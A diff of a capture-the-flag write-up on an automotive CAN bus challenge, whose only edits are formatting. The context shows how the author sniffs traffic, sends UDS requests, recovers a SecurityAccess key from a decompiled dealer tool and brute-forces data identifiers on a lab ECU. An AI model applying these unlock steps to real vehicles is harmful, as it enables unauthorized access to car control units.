@@ -4,7 +4,7 @@ published: 2026-05-18
 description: A dealer tool has been leaked dealer_unlock.pyc SecurityAccess guards the ECU's secrets. Break in and read the flag.
 image: ''
 tags: ["can"]
-authors: ["ShackWove"]
+authors: ["shackwove"]
 solves: 96
 points: 100
 category: NDIASAutomotive/IoTCTF
@@ -30,7 +30,7 @@ This is my first challenge with the CAN bus or automotive security. So please fe
 
 ## Info Gathering
 The file `./connect.sh` create a container to run this challenge. After the container is ready, it shows a banner with information about command we can use:
-```Bash
+```bash
 === NDIAS Automotive/IoT CTF Player ===
   candump vcan0                          # watch CAN traffic
   isotprecv -s <SRC> -d <DST> vcan0 &    # ISO-TP receiver
@@ -43,7 +43,7 @@ Each command has an explanation of its purpose. Let's start to use `candump vcan
 > Note: vcan0 is a virtual interface which is userful to communicate with the service.
 
 The output:
-```Bash
+```bash
 root@9cd4b4f4f139:/# candump -a -l vcan0 
 Disabled standard output while logging.
 Enabling Logfile 'candump-2026-05-16_072201.log'
@@ -52,7 +52,7 @@ Enabling Logfile 'candump-2026-05-16_072201.log'
 
 We use `-l` flag to save candump's output in a log file and filter its result:
 
-```Bash
+```bash
 root@9cd4b4f4f139:/# cat candump.log | grep -oP '.{3}#' | sort | uniq -c | sort -nr
      86 0C0#
      17 0D0#
@@ -99,7 +99,7 @@ IDs in the CAN bus are used for physical addressing during communication with th
 
 Now we know how to comunicate with a ECU. Let's use `isotprecv`:
 
-```Bash
+```bash
 root@c37f42bb4c89:/# isotprecv -s 7e0 -d 7e8 vcan0 &
 ```
 
@@ -107,11 +107,11 @@ root@c37f42bb4c89:/# isotprecv -s 7e0 -d 7e8 vcan0 &
 
 But this command alone doesn't provide any information, because we have to send a signal to the ECU and wait for a response. So we would use `isotpsent`:
 
-```Bash
+```bash
 root@c37f42bb4c89:/# echo "11" | isotpsend -s 7e0 -d 7e8 vcan0
 ```
 But we receive:
-```Bash
+```bash
 7f 11 11
 ```
 At least we got a response. But what are these hex values? I try to search it and I found this docs https://ramn.readthedocs.io/en/latest/userguide/diag_tutorial.html where is written:
@@ -130,7 +130,7 @@ We can now craft a payload with first byte 22, but what should we send next? May
 
 > `F1 8C` is a DID (Data Indentifier), which is used to request data from ECU in a vehicle. It's like an address where are stored data
 
-```Bash
+```bash
 root@c37f42bb4c89:/# isotprecv -s 7e0 -d 7e8 vcan0 &
 
 root@c37f42bb4c89:/# echo "22 F1 8C" | isotpsend -s 7e0 -d 7e8 vcan0
@@ -156,7 +156,7 @@ https://pylingual.io/
 
 
 The python code decompiled is the following:
-```Python
+```python
 # Decompiled with PyLingual (https://pylingual.io)
 # Internal filename: '/tmp/dealer_unlock.py'
 # Bytecode version: 3.12.0rc2 (3531)
@@ -197,7 +197,7 @@ if __name__ == '__main__':
 
 By looking at this code, we can avoid bypassing the hash check since we only want to generate the key. 
 
-```Python
+```python
 # Decompiled with PyLingual (https://pylingual.io)
 # Internal filename: '/tmp/dealer_unlock.py'
 # Bytecode version: 3.12.0rc2 (3531)
@@ -231,7 +231,7 @@ Now we need to run the Python script, passing the seed as an argument, send the 
 
 We request the seed:
 
-```Bash
+```bash
 isotprecv -s 7e0 -d 7e8 vcan0 &
 [1] 396              
 root@c37f42bb4c89:/# echo "27 01" | isotpsend -s 7e0 -d 7e8 vcan0
@@ -247,13 +247,13 @@ root@c37f42bb4c89:/# 50 03 00 32 01 F4
 
 Using the key in our python script:
 
-```Bash
+```bash
 [shackwove@pwned automotive]$ python3 exploit.py 462D8C6E
 F01F12DF
 ```
 Ok, we got the key, let's send it:
 
-```Bash 
+```bash 
 root@c37f42bb4c89:/# isotprecv -s 7e0 -d 7e8 vcan0 &
 [1] 404
 root@c37f42bb4c89:/# echo "27 02 F0 1F 12 DF" | isotpsend -s 7e0 -d 7e8 vcan0
@@ -264,7 +264,7 @@ The code `67` tell us that the service has been unlocked, now we are close to th
 
 We need to send a request to a valid DID to obtain the flag. After a few attempts (and so many re-connections that have undone all the work I've done so far), I wrote a simple script that performs a brute-force attack on DIDs and we found that DID `13 37` is the winner.
 
-```Bash
+```bash
 root@c37f42bb4c89:/# isotprecv -s 7e0 -d 7e8 vcan0 &
 [1] 407
 root@c37f42bb4c89:/# echo "22 13 37" | isotpsend -s 7e0 -d 7e8 vcan0
